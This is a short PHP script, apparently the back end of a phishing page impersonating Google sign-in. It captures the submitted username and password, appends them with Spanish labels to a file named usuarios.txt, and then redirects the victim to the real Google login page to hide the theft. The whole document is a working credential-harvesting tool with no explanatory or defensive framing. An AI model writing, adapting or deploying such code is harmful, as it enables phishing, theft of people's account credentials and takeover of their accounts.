<?php

file_put_contents("usuarios.txt", "Cuenta de google: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.google.com/servicelogin');
exit();
?>
